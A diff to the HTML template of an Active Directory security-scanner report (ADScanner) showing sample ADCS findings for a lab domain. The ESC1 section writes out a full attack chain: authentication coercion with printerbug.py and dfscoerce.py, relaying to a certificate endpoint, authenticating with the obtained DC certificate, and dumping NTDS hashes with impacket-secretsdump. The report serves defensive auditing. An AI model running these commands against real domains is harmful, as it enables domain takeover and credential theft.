@@ -3,124 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Report</title>
-    <style>
-        /* Style for the banner */
-        .banner {
-            background-color: #f2f2f2;
-            padding: 10px;
-            text-align: center;
-        }
-
-        /* Style for the logo */
-        .logo {
-            font-family: monospace;
-            white-space: pre;
-            font-weight: bold;
-        }
-
-        .summary {
-            max-width: 80%;
-            margin: 0 auto;
-            padding: 20px;
-            display: flex;
-        }
-
-        .main-header {
-            background-color: #333;
-            /* Darker background color */
-            color: #fff;
-            /* White text color */
-            padding: 10px;
-            /* Add padding */
-            margin: 0;
-            text-align: center;
-        }
-
-        .finding-header {
-            background-color: #515151;
-            text-align: center;
-            color: #fff;
-            padding: 10px;
-        }
-
-        h2 {
-            text-decoration: underline;
-        }
-
-        h3 {
-            text-decoration: underline;
-        }
-
-        /* Style for the container */
-        .finding-container {
-            max-width: 80%;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        /* Style for the table */
-        table {
-            border-collapse: collapse;
-            width: 100%;
-        }
-
-        th,
-        td {
-            border: 1px solid #ddd;
-            padding: 8px;
-            text-align: left;
-        }
-
-        th {
-            background-color: #f2f2f2;
-        }
-
-        .toggle:hover,
-        .link:hover {
-            background-color: #f5f5f5;
-            cursor: pointer;
-        }
-
-        .left-section {
-            flex: 1;
-            /* Grow and shrink equally */
-            margin-right: 20px;
-        }
-
-        /* Style for the tables */
-        .table-container {
-            margin-bottom: 20px;
-        }
-
-        .executive-summary {
-            flex: 2;
-        }
-
-        .risk {
-            width: 15%;
-            color: red;
-            font-weight: bold;
-        }
-
-        .risk-summary {
-            max-width: 82.5%;
-            margin: 0 auto;
-            padding: 0px;
-            margin-bottom: 50px;
-        }
-
-        .risk-summary-heading {
-            max-width: 80%;
-            text-align: center;
-            margin: 0 auto;
-            padding: 20px;
-        }
-    </style>
+    <title>test.local Vulnerability Report</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 
 <body>
-
     <div class="banner">
         <pre class="logo">
     /\   |  __ \ / ____|                                
@@ -141,7 +28,7 @@
             <div class="table-container">
                 <h3>Total risk score</h3>
                 <p>test.local = 250/100</p>
-                <table>
+                <table class="summary-table">
                     <thead>
                         <tr>
                             <th>Category</th>
@@ -158,7 +45,7 @@
             </div>
             <div class="table-container">
                 <h3>Details when ran</h3>
-                <table>
+                <table class="summary-table">
                     <thead>
                         <tr>
                             <th>User</th>
@@ -185,61 +72,78 @@
             <p>The below table summarises the number and criticality of the issues found during the audit:</p>
         </div>
     </div>
-
+    
     <!-- Executive prioritisation section -->
-    <div class="risk-summary">
+    <div class="risk-summary-container">
         <div class="risk-summary-heading">
             <h2>Risk Prioritisation Summary</h2>
             <p>The table below summarizes the number and criticality of findings in order of decreasing risk. Full
                 details can be found by clicking on each vulnerability which will take you to the relevant technical
                 section.</p>
         </div>
-        <table>
+        <table class="risk-prioritisation-summary">
             <thead>
                 <tr>
-                    <th>Technique</th>
-                    <th>Category</th>
-                    <th>Score</th>
+                    <th class="risk-column">Risk</th>
+                    <th class="technique-column">Technique</a></th>
+                    <th class="category-column">Category</th>
+                    <th class="score-column">Score</th>
                 </tr>
             </thead>
             <tbody>
-                <tr>
-                    <td class="link"><u>[CRITICAL] ESC1</u></td>
+                <tr class="critical">
+                    <td>Critical</td>
+                    <td><a href="#esc1"><u>ESC1</u></a></td>
                     <td>PKI</td>
                     <td>50</td>
                 </tr>
-                <tr>
-                    <td class="link"><u>[CRITICAL] ESC7</u></td>
+                <tr class="high">
+                    <td>High</td>   
+                    <td><a href="#esc1"><u>ESC1</u></a></td>
                     <td>PKI</td>
-                    <td>50</td>
+                    <td>35</td>
                 </tr>
-                <tr>
-                    <td class="link"><u>[CRITICAL] ESC8</u></td>
+                <tr class="medium">
+                    <td>Medium</td>
+                    <td><a href="#esc1"><u>ESC7</u></a></td>
                     <td>PKI</td>
-                    <td>50</td>
+                    <td>20</td>
+                </tr>
+                <tr class="low">
+                    <td>Low</td>
+                    <td><a href="#esc1"><u>ESC8</u></a></td>
+                    <td>PKI</td>
+                    <td>10</td>
+                </tr>
+                <tr class="information">
+                    <td>Informational</td>
+                    <td><a href="#esc1"><u>ESC8</u></a></td>
+                    <td>PKI</td>
+                    <td>1</td>
                 </tr>
             </tbody>
         </table>
     </div>
 
+    <!-- Technical section -->
     <div class="main-header">Technical section</div>
     <div class="finding-header">Domain info</div>
     <p></p>
     <div class="finding-header">PKI</div>
 
-    <!-- Technical section -->
+    <!--Technical table-->
     <div class="finding-container">
         <table>
             <thead>
                 <tr>
-                    <th>Technique</th>
-                    <th>Risk</th>
+                    <th class="table-header">Technique</th>
+                    <th class="table-header">Risk</th>
                 </tr>
             </thead>
             <tbody>
                 <tr>
-                    <td class="toggle"><u>ESC1</u></td>
-                    <td class="risk">CRITICAL</td>
+                    <td class="toggle" id="esc1"><u>ESC1</u></td>
+                    <td class="finding-riskcritical">Critical</td>
                 </tr>
                 <tr class="finding">
                     <td colspan="3">
@@ -247,32 +151,81 @@
                             <table>
                                 <tbody>
                                     <tr>
-                                        <td>User can enroll in certificate template for authentication and supply an
-                                            arbitrary SAN</td>
-                                        <td>MITRE ATT&CK ref</td>
-                                        <td>50</td>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Low privileged user can enroll in certificate template for authentication
+                                            and supply an arbitrary SAN</td>
+                                        <td>T-15940</td>
+                                        <td>+50</td>
                                     </tr>
                                 </tbody>
                             </table>
                             <table>
                                 <tbody>
                                     <tr>
-                                        <td>PScustomobject</td>
-                                        <td><p>Issue explanation</p></td>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>PScustomobject info</td>
+                                        <td>
+                                            <p>Enrolling in this certificate template allows low privileged users to
+                                                escalate their privileges to domain administrator by using a simple
+                                                python script</p>
+                                            <p><u>Links to further information</u></p>
+                                        </td>
                                     </tr>
                                 </tbody>
                             </table>
                             <table>
                                 <tbody>
                                     <tr>
-                                        <td><p>Attack explanation</p></td>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. Coercing machine authentication back to the attacking machine (192.168.10.130) can be done with printerbug.py or dfscoerce.py.</p>
+                                                    <p>python3 printerbug.py test:'Password123'@192.168.10.141 192.168.10.130</p>
+                                                    <p>python3 dfscoerece.py -u test -p 'Password123!' -d test.local 192.168.10.130 192.168.18.141</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/ESC8/ESC-8.png" alt="Image Description">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. Authentication is then relayed to an unsecured certificate endpoint to obtain a pfx certificate for the domain controller. This is then used to replicate the behavior of a domain controller and replicate the contents of NTDS.dit via a DCSync.</p>
+                                                    <p>python3 entry.py relay -target 'http://192.168.10.141' -template DomainController</p>
+                                                    <p>python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
+                                                    <p>impacket-secretsdump 'dc$'@192.168.10.141 -hashes :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/ESC8/ESC8-1.png" alt="Image Description">
+                                                </span>
+                                            </div>
+                                        </td>
                                     </tr>
                                 </tbody>
                             </table>
                             <table>
                                 <tbody>
                                     <tr>
-                                        <td><p>Contextualized remediation (GPT)</p></td>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>Remove the ability for users to supply an arbitrary SAN in the
+                                                certificate template or restrict who can enroll within the template to
+                                                privileged users only</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
                                     </tr>
                                 </tbody>
                             </table>
@@ -281,7 +234,7 @@
                 </tr>
                 <tr>
                     <td class="toggle"><u>ESC7</u></td>
-                    <td class="risk">CRITICAL</td>
+                    <td class="finding-riskhigh">High</td>
                 </tr>
                 <tr class="finding">
                     <td colspan="3">
@@ -292,7 +245,29 @@
                 </tr>
                 <tr>
                     <td class="toggle"><u>ESC8</u></td>
-                    <td class="risk">CRITICAL</td>
+                    <td class="finding-riskmedium">Medium</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <p>Full finding info here...</p>
+                        </div>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="toggle"><u>ESC8</u></td>
+                    <td class="finding-risklow">Low</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <p>Full finding info here...</p>
+                        </div>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="toggle"><u>ESC8</u></td>
+                    <td class="finding-riskinformational">Informational</td>
                 </tr>
                 <tr class="finding">
                     <td colspan="3">
@@ -323,8 +298,11 @@
     <p></p>
 
     <div class="main-header">Disclosure and next steps</div>
-    <p></p>
-
+    <p>ADScanner is intended for use on authorised systems only. Users must obtain explicit consent from system owners
+        before using the tool on any network or actions could lead to serious legal repercussions.
+        The creator is not responsible for any resulting damages or losses</p>
+    <p>Once read through the report follow the remediation steps, then rerun the scanner on a periodic basis to see the
+        risks score decrease!</p>
 
     <!-- js to drop down each finding-->
     <script>
